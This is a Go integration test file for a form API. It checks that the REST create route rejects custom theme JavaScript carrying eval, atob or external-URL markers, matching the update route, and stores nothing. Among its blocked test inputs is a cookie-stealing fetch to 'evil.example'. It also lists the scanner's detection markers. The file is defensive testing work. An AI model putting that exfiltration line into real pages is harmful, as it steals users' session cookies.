package httpapi

// Card t_62190342 — REST form CREATE stored an unscanned theme.custom_js.
//
// THE DEFECT, measured from outside on live prod v1.21.285 (api a1c2be6f), same
// session, same value, the two halves of one REST surface:
//
//	PATCH /v1/rest/forms/{id}?workspace=<ws> {"theme":{"custom_js":"eval('2+2');"}}
//	  -> 400 {"code":"request.badRequest","error":"custom_js rejected: active code execution marker: eval("}
//	POST  /v1/rest/forms?workspace=<ws>      {"theme":{"custom_js":"eval('2+2');"}}
//	  -> 201, and `select theme->>'custom_js' from forms` returned eval('2+2'); verbatim
//
// createForm ran urlguard.CheckTheme / CheckConfigShape / UnsupportedBlock /
// ValidateAndNormalizeConfig but no customform.ScanCustomJS arm, while updateForm
// and both MCP doors (mcpsrv form_creation.go, parity.go) did. The one write path
// that MINTS a form was the only one that skipped the scan — and since v1.21.283
// the block-rendered buyer page serves that value verbatim, so an unscanned
// create is live code on the buyer's page, not a quoted no-op.
//
// These tests drive the REAL mux with a real API key against real Postgres and
// assert on the ROW (what was written) as well as the status, because "400 and
// nothing stored" is the whole contract: a guard that answered 400 after the
// INSERT would still ship the defect.
//
// BITE: delete the `customform.ScanCustomJS` arm from createForm and
// TestCreateFormRefusesBlockedCustomJS gets 201 (the carded defect) while the
// tree still compiles; the benign/control arms keep passing, so the failure
// names the scan and not the route.

import (
	"encoding/json"
	"errors"
	"net/http"
	"strings"
	"testing"

	"github.com/jackc/pgx/v5"
)

// formBody builds a create body. theme is passed through as given so a test can
// omit the key entirely (`theme == nil`), send the empty map, or carry a value.
func customJSCreateBody(t *testing.T, slug string, theme map[string]any) string {
	t.Helper()
	body := map[string]any{"title": "custom js " + slug, "slug": slug}
	if theme != nil {
		body["theme"] = theme
	}
	raw, err := json.Marshal(body)
	if err != nil {
		t.Fatalf("marshal create body: %v", err)
	}
	return string(raw)
}

// customJSStoredOnSlug reads theme->>'custom_js' straight out of the database.
// The assertion that matters is what LANDED, not what a response claimed. A
// missing row returns ("", false) rather than failing: for a REFUSED write the
// absence of the row IS the expectation.
func customJSStoredOnSlug(t *testing.T, fx renameFixture, slug string) (string, bool) {
	t.Helper()
	var js *string
	err := fx.pool.QueryRow(fx.ctx,
		`SELECT theme->>'custom_js' FROM forms WHERE slug=$1 AND account_id=$2 AND deleted_at IS NULL`,
		slug, fx.accountID).Scan(&js)
	if errors.Is(err, pgx.ErrNoRows) {
		return "", false
	}
	if err != nil {
		t.Fatalf("read stored theme.custom_js for %q: %v", slug, err)
	}
	if js == nil {
		return "", false
	}
	return *js, true
}

// TestCreateFormRefusesBlockedCustomJS is the card's acceptance criterion on the
// exact surface the defect was measured on: POST /v1/rest/forms must answer the
// same 400, with the same sentence, that PATCH already answers for the same
// value — and must store nothing.
func TestCreateFormRefusesBlockedCustomJS(t *testing.T) {
	fx := newRenameFixture(t, "it-cjs-create-"+randHex(4))

	blocked := []struct {
		name       string
		js         string
		wantReason string
	}{
		{"eval", "eval('2+2');", "active code execution marker: eval("},
		{"atob", "var x = atob('ZXZhbCgyKzIp');", "obfuscation/beacon marker: atob("},
		{"external url", "fetch('http://evil.example/collect?c=' + document.cookie);", "reference to external URL from custom JS"},
	}
	for _, tc := range blocked {
		slug := "it-cjs-blocked-" + randHex(6)
		body := customJSCreateBody(t, slug, map[string]any{"custom_js": tc.js})
		code, raw := tplReq(t, fx.h, fx.key, http.MethodPost, "/v1/rest/forms", body)
		if code != http.StatusBadRequest {
			t.Fatalf("POST /v1/rest/forms with custom_js %q (%s) = %d (body %s), want 400.\n"+
				"A 201 here IS the carded defect: createForm stores the value unscanned while "+
				"PATCH /v1/rest/forms/{id} answers 400 `custom_js rejected: …` for the identical "+
				"string, and since v1.21.283 the block-rendered buyer page executes what was stored.",
				tc.js, tc.name, code, raw)
		}
		bodyText := string(raw)
		if !strings.Contains(bodyText, `"custom_js rejected: `) {
			t.Errorf("400 body for %s = %s, want it to carry `custom_js rejected: <reason>` — the "+
				"same wording updateForm answers, so one rule reads one way on both form write paths",
				tc.name, bodyText)
		}
		if !strings.Contains(bodyText, tc.wantReason) {
			t.Errorf("400 body for %s = %s, want it to name the reason %q the shared scan gives",
				tc.name, bodyText, tc.wantReason)
		}
		// A refused write must leave nothing behind — the row is the defect.
		if n := liveFormCount(t, fx, slug); n != 0 {
			t.Fatalf("%d live forms on %q after a refused create, want 0 — the blocked JS was "+
				"stored anyway", n, slug)
		}
		if js, ok := customJSStoredOnSlug(t, fx, slug); ok {
			t.Fatalf("a refused create left theme.custom_js = %q on the row", js)
		}
	}
}

// TestCreateFormStoresBenignCustomJSVerbatim is the other half of the contract:
// the scan refuses markers, not the feature. A legitimate form-behaviour script
// (event handlers are the norm for custom_js, which is why this scan is not the
// assetgate one) must still create, and must be stored unchanged.
func TestCreateFormStoresBenignCustomJSVerbatim(t *testing.T) {
	fx := newRenameFixture(t, "it-cjs-benign-"+randHex(4))
	js := "document.addEventListener('submit', function () { window.__jfOk = 1; });"
	slug := "it-cjs-ok-" + randHex(6)

	code, raw := tplReq(t, fx.h, fx.key, http.MethodPost, "/v1/rest/forms",
		customJSCreateBody(t, slug, map[string]any{"primary": "#5e6ad2", "custom_js": js}))
	if code != http.StatusCreated {
		t.Fatalf("POST /v1/rest/forms with a benign custom_js = %d (body %s), want 201 — the "+
			"scan must refuse markers, not merchant behaviour JS", code, raw)
	}
	got, ok := customJSStoredOnSlug(t, fx, slug)
	if !ok || got != js {
		t.Fatalf("stored theme.custom_js = %q (present %v), want %q verbatim", got, ok, js)
	}
}

// TestCreateFormWithoutCustomJSStillCreates is the "no other behaviour change"
// arm from the card: an omitted theme, an empty theme, a theme without
// custom_js, and an explicit empty/null custom_js all still create. A guard that
// keyed on the presence of `theme` would break every API caller that sends one.
func TestCreateFormWithoutCustomJSStillCreates(t *testing.T) {
	fx := newRenameFixture(t, "it-cjs-none-"+randHex(4))

	cases := []struct {
		name  string
		theme map[string]any
	}{
		{"no theme at all", nil},
		{"empty theme", map[string]any{}},
		{"theme without custom_js", map[string]any{"primary": "#111111"}},
		{"empty custom_js", map[string]any{"custom_js": ""}},
		{"null custom_js", map[string]any{"custom_js": nil}},
	}
	for _, tc := range cases {
		slug := "it-cjs-none-" + randHex(6)
		code, raw := tplReq(t, fx.h, fx.key, http.MethodPost, "/v1/rest/forms",
			customJSCreateBody(t, slug, tc.theme))
		if code != http.StatusCreated {
			t.Fatalf("POST /v1/rest/forms with %s = %d (body %s), want 201 — a form that carries "+
				"no custom JS must always create", tc.name, code, raw)
		}
		if js, ok := customJSStoredOnSlug(t, fx, slug); ok && js != "" {
			t.Errorf("%s: stored theme.custom_js = %q, want absent or empty", tc.name, js)
		}
	}
}

// TestCreateAndPatchAnswerBlockedCustomJSIdentically pins the parity itself, on
// the card's recorded pair: one value, two routes, one answer. It fails if either
// half drifts — including a future create-side check that returns 400 with a
// different sentence, which would leave the API describing one rule two ways.
func TestCreateAndPatchAnswerBlockedCustomJSIdentically(t *testing.T) {
	fx := newRenameFixture(t, "it-cjs-parity-"+randHex(4))
	const js = "eval('2+2');"
	want := `custom_js rejected: active code execution marker: eval(`

	// PATCH the fixture's existing form — the half that already worked.
	patchCode, patchRaw := fx.patch(t, `{"theme":{"custom_js":"eval('2+2');"}}`)
	if patchCode != http.StatusBadRequest {
		t.Fatalf("PATCH /v1/rest/forms/{id} with %q = %d (body %s), want 400 — this is the "+
			"behaviour POST must match", js, patchCode, patchRaw)
	}

	slug := "it-cjs-parity-" + randHex(6)
	postCode, postRaw := tplReq(t, fx.h, fx.key, http.MethodPost, "/v1/rest/forms",
		customJSCreateBody(t, slug, map[string]any{"custom_js": js}))
	if postCode != http.StatusBadRequest {
		t.Fatalf("POST /v1/rest/forms with %q = %d (body %s), want 400 — the carded defect",
			js, postCode, postRaw)
	}

	var patchOut, postOut struct {
		Code  string `json:"code"`
		Error string `json:"error"`
	}
	if err := json.Unmarshal(patchRaw, &patchOut); err != nil {
		t.Fatalf("decode PATCH body %s: %v", patchRaw, err)
	}
	if err := json.Unmarshal(postRaw, &postOut); err != nil {
		t.Fatalf("decode POST body %s: %v", postRaw, err)
	}
	if postOut.Error != want || patchOut.Error != want {
		t.Fatalf("blocked custom_js answers differ by route: POST error %q, PATCH error %q, want both %q",
			postOut.Error, patchOut.Error, want)
	}
	if postOut.Code != patchOut.Code {
		t.Errorf("refusal code differs by route: POST %q, PATCH %q — one situation, one code",
			postOut.Code, patchOut.Code)
	}
	if n := liveFormCount(t, fx, slug); n != 0 {
		t.Fatalf("%d live forms on %q after the refused create, want 0", n, slug)
	}
}
